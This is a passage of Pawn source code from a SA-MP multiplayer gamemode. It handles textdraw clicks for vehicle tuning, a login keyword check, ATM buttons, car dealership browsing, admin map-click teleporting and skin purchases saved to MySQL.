				if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) 
				{
					TPInfo[ playerid ][ tID ] = i;
					break;
				}
			}
		}
	    if( TPInfo[ playerid ][ tID ] == -1 ) return SCM( playerid, -1, "No parts compatible with your vehicle" );

		new cid = TPInfo[ playerid ][ tID ];
		TPInfo[ playerid ][ tType ] = CARMODTYPE_HYDRAULICS;
		TPInfo[ playerid ][ tPaintjob ] = false;

	    TogglePlayerControllable( playerid, false );
	    TuningTDControl( playerid, true );

	    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
		PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

        AddVehicleComponent( vehicleid, cTInfo[ cid ][ cID ] );

		SelectTextDraw( playerid, 0xFF000000);
	}
	if(playertextid == TuneTD[7])
	{
		//|----------cameradinspate----------|
		InterpolateCameraPos(playerid, 265.925750, -167.007904, 1071.765258, 261.750823, -175.495254, 1071.980346, 3000);
		InterpolateCameraLookAt(playerid, 262.974700, -170.593673, 1069.912231, 263.993316, -171.593124, 1069.802124, 3000);
		PlayerTextDrawSetString(playerid, TuningBuy[playerid][1], "CATEGORIE:_NITRO");
		new vehicleid = GetPlayerVehicleID(playerid);
		TPInfo[playerid][tID] = -1;
		for( new i = 0; i < MAX_COMPONENTS; i++ ) 
		{
			if(cTInfo[ i ][ cType ] == CARMODTYPE_NITRO) 
			{
			
				if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) 
				{
					TPInfo[ playerid ][ tID ] = i;
					break;
				}
			}
		}
	    if( TPInfo[ playerid ][ tID ] == -1 ) return SCM( playerid, -1, "No parts compatible with your vehicle" );

		new cid = TPInfo[ playerid ][ tID ];
		TPInfo[ playerid ][ tType ] = CARMODTYPE_NITRO;
		TPInfo[ playerid ][ tPaintjob ] = false;

	    TogglePlayerControllable( playerid, false );
	    TuningTDControl( playerid, true );

	    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
		PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

        AddVehicleComponent(vehicleid, cTInfo[ cid ][ cID ]);

		SelectTextDraw(playerid, 0xFF000000);
	}
	if(playertextid == TuneTD[5])
	{
		//|----------camera din fata----------|
		InterpolateCameraPos(playerid, 268.983154, -175.870849, 1073.296752, 260.771148, -166.982559, 1071.866210, 3000);
		InterpolateCameraLookAt(playerid, 265.597778, -172.630737, 1071.552978, 264.244964, -170.180847, 1070.221923, 3000);
		PlayerTextDrawSetString(playerid, TuningBuy[playerid][1], "CATEGORIE:_PAINTJOBS");
		new vehicleid = GetPlayerVehicleID(playerid);
		TPInfo[playerid][tID] = -1;
		for( new i = 0; i < NUMBER_TYPE_PAINTJOB; i++ ) 
		{
			if( pjInfo[ i ][ vehTID ] == GetVehicleModel( vehicleid ) ) 
			{
				TPInfo[ playerid ][ tID ] = i;
				break;
			}
		}	
		if(TPInfo[ playerid ][ tID ] == -1 ) return SCM( playerid, -1, "No parts compatible with your vehicle" );
					
		new pid = TPInfo[playerid][tID];
		TPInfo[playerid][tPaintjob] = true;
											
		TogglePlayerControllable(playerid, false );
	    TuningTDControl(playerid, true);

		ChangeVehicleColor(vehicleid, 1, 1 );
        ChangeVehiclePaintjob( vehicleid, pjInfo[ pid][ pNumber ] );

	    format( globalstring, sizeof( globalstring ), "%s", pjInfo[ pid ][ pName ] );
		PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );
		SelectTextDraw(playerid, 0xFF000000);	
	}
	if(playertextid == TuningBuy[ playerid ][ 14 ]) 
	{
            if( !IsPlayerInAnyVehicle( playerid ) ) return SCM(playerid, COLOR_ERROR, "You're not in the vehicle." );
	        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SCM(playerid, COLOR_ERROR, "You're the driver of this vehicle." );
	            
            if(TPInfo[playerid][tPaintjob] == false) 
			{
				new compid = -1, vehicleid = GetPlayerVehicleID( playerid );
            
	            for( new i = ( TPInfo[ playerid ][ tID ]+1 ); i < MAX_COMPONENTS; i++ ) 
				{
					if( cTInfo[ i ][ cType ] == TPInfo[ playerid ][ tType ] ) 
					{
						if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel(vehicleid), cTInfo[i][cID])) 
						{
							compid = i;
							break;
						}
					}
				}
				if( compid == -1 ) return 1;

	            RemoveVehicleComponent( vehicleid, cTInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

	            TPInfo[ playerid ][ tID ] = compid;

	            format( globalstring, sizeof( globalstring ), "%s", cTInfo[ compid ][ cName ] );
				PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

				AddVehicleComponent( vehicleid, cTInfo[ compid ][ cID ] );

				SelectTextDraw( playerid, 0xFF000000 );
			}
			else if( TPInfo[ playerid ][ tPaintjob ] == true ) {
			
			    new paintid = -1, vehicleid = GetPlayerVehicleID( playerid );
			    
			    for( new i = ( TPInfo[ playerid ][ tID ]+1 ); i < NUMBER_TYPE_PAINTJOB; i++ ) {
			    	if( pjInfo[ i ][ vehTID ] == GetVehicleModel( vehicleid ) ) {
						paintid = i;
						break;
					}
			   	}
			   	if( paintid == -1 ) return 1;

                TPInfo[ playerid ][ tID ] = paintid;
                
                format( globalstring, sizeof( globalstring ), "%s", pjInfo[ paintid ][ pName ] );
				PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );
                
                ChangeVehiclePaintjob( vehicleid, pjInfo[ paintid ][ pNumber ] );
                
                SelectTextDraw( playerid, 0xFF000000 );
			}
    }
    if(playertextid == TuningBuy[playerid][13]) 
	{
            if( TPInfo[ playerid ][ tPaintjob ] == false ) 
			{
	            if( !IsPlayerInAnyVehicle( playerid ) ) return SCM(playerid, COLOR_ERROR, "You're not in the vehicle." );
		        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SCM(playerid, COLOR_ERROR, "You're the driver of this vehicle." );

	            new compid = -1, vehicleid = GetPlayerVehicleID( playerid );

	            for( new i = (TPInfo[ playerid ][ tID ]-1); i > 0; i-- ) {
					if( cTInfo[ i ][ cType ] == TPInfo[ playerid ][ tType ] ) {
						if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) {
							compid = i;
							break;
						}
					}
				}
				if( compid == -1 ) return 1;

				RemoveVehicleComponent( vehicleid, cTInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

	            TPInfo[ playerid ][ tID ] = compid;

	            format( globalstring, sizeof( globalstring ), "%s", cTInfo[ compid ][ cName ] );
				PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

				AddVehicleComponent( vehicleid, cTInfo[ compid ][ cID ] );

				SelectTextDraw( playerid, 0xFF000000 );
			}
			else if( TPInfo[ playerid ][ tPaintjob ] == true ) {

			    new paintid = -1, vehicleid = GetPlayerVehicleID( playerid );

			    for( new i = (TPInfo[ playerid ][ tID ]-1); i > 0; i-- ) {
			    	if( pjInfo[ i ][ vehTID ] == GetVehicleModel( vehicleid ) ) {
						paintid = i;
						break;
					}
			   	}
			   	if( paintid == -1 ) return 1;

                TPInfo[ playerid ][ tID ] = paintid;

                format( globalstring, sizeof( globalstring ), "%s", pjInfo[ paintid ][ pName ] );
				PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                ChangeVehiclePaintjob( vehicleid, pjInfo[ paintid ][ pNumber ] );

                SelectTextDraw( playerid, 0xFF000000 );
			}
        }
    if( playertextid == TuningBuy[ playerid ][ 5 ] ) 
	{
            if(!IsPlayerInAnyVehicle( playerid ) ) return SCM(playerid, COLOR_ERROR, "You're not in the vehicle." );
	        if(GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SCM(playerid, COLOR_ERROR, "You're the driver of this vehicle." );

            new vehicleid = GetPlayerVehicleID( playerid );

            if( TPInfo[ playerid ][ tPaintjob ] == false ) 
			{
            
				if(GetPlayerCash( playerid ) < cTInfo[ TPInfo[ playerid ][ tID ] ][ cPrice ] ) return SCM(playerid, COLOR_ERROR, "You do not have enough money." );

				new cid = TPInfo[ playerid ][ tID ];

		        RemoveVehicleComponent( vehicleid, cTInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

		        SaveComponent( vehicleid, cTInfo[ cid ][ cID ] );
		        
		        GivePlayerCash( playerid, -cTInfo[ TPInfo[ playerid ][ tID ] ][ cPrice ] );

			}
			else if( TPInfo[ playerid ][ tPaintjob ] == true ) 
			{
			
			    if(GetPlayerCash( playerid ) < pjInfo[ TPInfo[ playerid ][ tID ] ][ pPrice ] ) return SCM(playerid, COLOR_ERROR, "You do not have enough money." );
			
			    new paintid = TPInfo[ playerid ][ tID ];
			    
			    GivePlayerCash( playerid, -pjInfo[ TPInfo[ playerid ][ tID ] ][ pPrice ] );
			  			    
			    ChangeVehiclePaintjob(vehicleid, pjInfo[ paintid ][ pNumber ]);
				CarInfo[OwnedVeh(vehicleid)][cPaintJ] = pjInfo[paintid][pNumber];
				vUpdate(OwnedVeh(vehicleid), cPaintJx);
			
			}			
		    TuningTDControl(playerid, false );
		    TogglePlayerControllable(playerid, true);
    }
    if(playertextid == TuningBuy[playerid][7])
	{
            if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_ERROR, "You're not in the vehicle.");
	        if(GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SCM(playerid, COLOR_ERROR, "You're the driver of this vehicle.");

            new vehicleid = GetPlayerVehicleID( playerid );

			if( TPInfo[ playerid ][ tPaintjob ] == false ) 
			{
		        RemoveVehicleComponent(vehicleid, cTInfo[TPInfo[playerid][tID]][cID]);
			}
			else if( TPInfo[ playerid ][ tPaintjob ] == true ) 
			{
			    ChangeVehiclePaintjob( vehicleid, 3 );
				ChangeVehicleColor( vehicleid, TPInfo[ playerid ][ PJColor ][ 0 ], TPInfo[ playerid ][ PJColor ][ 1 ] );
			}
			TuningTDControl( playerid, false );
			TogglePlayerControllable( playerid, true );
	}	
	if(playertextid == TuneTD[1])
	{
		PlayerTextDrawSetString(playerid, TuningBuy[playerid][1], "CATEGORIE:_WHEELS");
		new vehicleid = GetPlayerVehicleID(playerid);
		TPInfo[playerid][tID] = -1;
	    for(new i = 0; i < MAX_COMPONENTS; i++) 
		{
			if(cTInfo[i][cType] == CARMODTYPE_WHEELS) 
			{
				if(cTInfo[i][cID] == IsComponentidCompatible(GetVehicleModel(vehicleid), cTInfo[i][cID])) 
				{
					TPInfo[playerid][tID] = i;
					break;
				}
			}
		}
	    if(TPInfo[playerid][tID] == -1) return SCM(playerid, -1, "These components are not compatible with your vehicle.");

		new cid = TPInfo[playerid][tID];
		TPInfo[playerid][tType] = CARMODTYPE_WHEELS;
		TPInfo[playerid][tPaintjob] = false;

	    TogglePlayerControllable(playerid, false );
	    TuningTDControl(playerid, true );

	    format(globalstring, sizeof(globalstring), "%s", cTInfo[cid][cName]);
		PlayerTextDrawSetString(playerid, TuningBuy[playerid][4], globalstring);

        AddVehicleComponent(vehicleid, cTInfo[cid][cID]);
		
		SelectTextDraw(playerid, 0xFF000000);
		//|----------cameradeperateral----------|
		InterpolateCameraPos(playerid, 265.382598, -175.946472, 1071.898193, 266.331298, -169.223434, 1070.523071, 3000);
		InterpolateCameraLookAt(playerid, 262.792510, -172.247375, 1069.751586, 262.433868, -172.139846, 1069.380859, 3000);
	}
	if(playertextid == SecuritateTD[playerid][3])
	{
		if(securitatenr[playerid] > 1) return SCM(playerid, COLOR_ERROR, "You finished number 1, go to step number 2.");
		if(securitatenr[playerid] == 3) return SCM(playerid, COLOR_SERVER, "Have finished the 2 steps, please click on the button 'Completed'!");
		ShowPlayerDialog(playerid, DIALOG_SECURITATE1, DIALOG_STYLE_MSGBOX, "Server: Security", "By clicking 'Accept' you will be automatically entered your account password!\nBy clicking 'Refuse' account password you will not be introduced!","Accept","Refuse");
		TogglePlayerControllable(playerid, 0);
	}
	if(playertextid == SecuritateTD[playerid][4])
	{
		if(securitatenr[playerid] == 1) return SCM(playerid, COLOR_ERROR, "You have reached step number 2, go to step number 1.");
		if(securitatenr[playerid] == 3) return SCM(playerid, COLOR_SERVER, "You finished the 2 steps, please click on the button 'Completed'!");
		ShowPlayerDialog(playerid, DIALOG_SECURITATE2, DIALOG_STYLE_INPUT, "Server: Security", "Enter the keyword of your account, then click the green button > Completed.", "Completed","");
		TogglePlayerControllable(playerid, 0);
	}
	if(playertextid == SecuritateTD[playerid][7])
	{
		if(securitatenr[playerid] < 3) return SCM(playerid, COLOR_ERROR, "You did not fill the space above!");
		securitatenr[playerid] = 0;
		gPlayerLogged[playerid] = 1;
		CancelSelectTextDraw(playerid);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][0]);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][1]);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][2]);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][3]);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][4]);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][5]);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][6]);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][7]);
		PlayerTextDrawHide(playerid, SecuritateTD[playerid][8]);
		SCM(playerid, COLOR_YELLOW, "Congratulations! The key word entered was correct, I wish you a nice game!");
		TogglePlayerControllable(playerid, 1);
		timercuvantcheie[playerid] = -1;
	}
	if(playertextid ==  ATMTD[playerid][11])
	{
		OpresteATM(playerid);
		CancelSelectTextDraw(playerid);
	}
	if(playertextid == ATMTD[playerid][5])
	{
	    format(string, sizeof(string), "Check funds...");
	    PlayerTextDrawSetString(playerid, ATMTD[playerid][10],string);
	    PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
	    atminterogare[playerid] = 3;
	}
	if(playertextid == ATMTD[playerid][6])
	{
	    format(string, sizeof(string), "Processing...");
	    PlayerTextDrawSetString(playerid, ATMTD[playerid][10],string);
	    PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
	    atmretragere[playerid] = 3;
	}
	if(playertextid == ATMTD[playerid][7])
	{
	    format(string, sizeof(string), "Processing...");
	    PlayerTextDrawSetString(playerid, ATMTD[playerid][10],string);
	    PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
	    atmtransfer[playerid] = 3;
	}
	if(playertextid == DealerShipTD[playerid][21])
	{
	    new idstock = BuyCar[playerid];
        if(idstock >= 1 && idstock < 101) return InsertCar(playerid,1,idstock,0),DealerShipTextDrawHide(playerid),CancelSelectTextDraw(playerid);
		//Cumparare
	}
	if(playertextid == DealerShipTD[playerid][22])
	{
		//Anulare
		DealerShipTextDrawHide(playerid);
		CancelSelectTextDraw(playerid);
		SCM(playerid, COLOR_ERROR, "you canceled");
	}
	if(playertextid == DealerShipTD[playerid][10])
	{
		vcol1[playerid] = 1;
		new idstock = BuyCar[playerid];
		ChangeVehicleColor(DSCAR[playerid], vcol1[playerid], vcol2[playerid]);
		PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
	}
	if(playertextid == DealerShipTD[playerid][11])
	{
		new idstock = BuyCar[playerid];
		vcol1[playerid] = 3;
		ChangeVehicleColor(DSCAR[playerid], vcol1[playerid], vcol2[playerid]);
		PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
	}
	if(playertextid == DealerShipTD[playerid][12])
	{
		new idstock = BuyCar[playerid];
		vcol1[playerid] = 2;
		ChangeVehicleColor(DSCAR[playerid], vcol1[playerid], vcol2[playerid]);
		PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
	}
	if(playertextid == DealerShipTD[playerid][13])
	{
		new idstock = BuyCar[playerid];
		vcol1[playerid] = 6;
		ChangeVehicleColor(DSCAR[playerid], vcol1[playerid], vcol2[playerid]);
		PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
	}
	if(playertextid == DealerShipTD[playerid][14])
	{
		new idstock = BuyCar[playerid];
		vcol2[playerid] = 1;
		ChangeVehicleColor(DSCAR[playerid], vcol1[playerid], vcol2[playerid]);
		PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
	}
	if(playertextid == DealerShipTD[playerid][15])
	{
		if(BuyCar[playerid] != -1)
		{
			new idstock = BuyCar[playerid];
			vcol2[playerid] = 3;
			ChangeVehicleColor(DSCAR[playerid], vcol1[playerid], vcol2[playerid]);
			PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
			PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
			format(string, sizeof(string), "%s",Stock[idstock][vName]);
			PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
			PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
			format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
			PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
			PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
			PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
			PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
		}	
	}
	if(playertextid == DealerShipTD[playerid][16])
	{
		new idstock = BuyCar[playerid];
		vcol2[playerid] = 2;
		ChangeVehicleColor(DSCAR[playerid], vcol1[playerid], vcol2[playerid]);
		PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
	}
	if(playertextid == DealerShipTD[playerid][17])
	{
		new idstock = BuyCar[playerid];
		vcol2[playerid] = 6;
		ChangeVehicleColor(DSCAR[playerid], vcol1[playerid], vcol2[playerid]);
		PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
	}
	if(playertextid == DealerShipTD[playerid][2])
	{
	    if(BuyCar[playerid] > 1) BuyCar[playerid]--;
	    else if(BuyCar[playerid] == 1)  BuyCar[playerid] = 100;
	    new idstock = BuyCar[playerid];
		DestroyVehicle(DSCAR[playerid]);
		DSCAR[playerid] = CreateVehicle(Stock[idstock][vModel], 1578.0552,-1257.0072,17.2508,141.2787,vcol1[playerid],vcol2[playerid],-1);
	    PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
		SetVehicleVirtualWorld(DSCAR[playerid], 69*playerid);
	    //Inapoi
	}
	if(playertextid == DealerShipTD[playerid][3])
	{
	    if(BuyCar[playerid] < 100)  BuyCar[playerid]++;
	    else if(BuyCar[playerid] >= 100)  BuyCar[playerid] = 1;
	    new idstock = BuyCar[playerid];
		DestroyVehicle(DSCAR[playerid]);
		DSCAR[playerid] = CreateVehicle(Stock[idstock][vModel], 1578.0552,-1257.0072,17.2508,141.2787,vcol1[playerid],vcol2[playerid],-1);
	    PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], vcol1[playerid], vcol2[playerid]);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_%d~n~CULOARE_2:_%d~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),vcol1[playerid],vcol2[playerid],FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
		SetVehicleVirtualWorld(DSCAR[playerid], 69*playerid);
	    //Inainte
	}
	return 1;
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	if(clickedid == Text:INVALID_TEXT_DRAW)
	{
		if(in_afacere_cu[playerid] >= 0)
		{
			Afacere(playerid, in_afacere_cu[playerid], false);
		}
		/*if(MizaKeno[playerid] > 0)
		{
			MizaKeno[playerid] = 0;
			CancelSelectTextDraw(playerid);
			for(new i = 0; i < sizeof(KenoTD); i++) PlayerTextDrawHide(playerid, KenoTD[i]);
			timerkeno[playerid] = -1;
		}*/
		if(CumparaSkin[playerid] > 0) 
		{
			SetPlayerVirtualWorld(playerid, 0);
			SetCameraBehindPlayer(playerid);
			CumparaSkin[playerid] = 0;
			CancelSelectTextDraw(playerid);
			for(new i = 0; i < sizeof(SkinTD); i++) PlayerTextDrawHide(playerid, SkinTD[i]);
			SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			new id = InBussines[playerid];
			SetPlayerVirtualWorld(playerid, BizzInfo[id][bVirtual]);
			SetPlayerInterior(playerid, BizzInfo[id][bInterior]);
			SetPlayerPosEx(playerid, BizzInfo[id][bExitX], BizzInfo[id][bExitY], BizzInfo[id][bExitZ]);
		}
		if(InTunning[playerid] == 1)
		{
			InTunning[playerid] = 3;
			CancelSelectTextDraw(playerid);
		}	
	    if(esteinds[playerid] > 0)
	    {
	        DealerShipTextDrawHide(playerid);
			CancelSelectTextDraw(playerid);
		}
		if(esteinATM[playerid] > 0)
		{
			OpresteATM(playerid);
			CancelSelectTextDraw(playerid);
		}
	}
}
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
	    if (GetPlayerState(playerid) == 2)
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePos(tmpcar, fX, fY, fZ+5);
		}
		else
		{
			SetPlayerPosFindZ(playerid, fX, fY, fZ+5);
		}
	}
    return 1;
}

public OnPlayerModelSelection(playerid, response, listid, modelid)
{
    new string[256];
    if(listid == skinlist)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist1)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
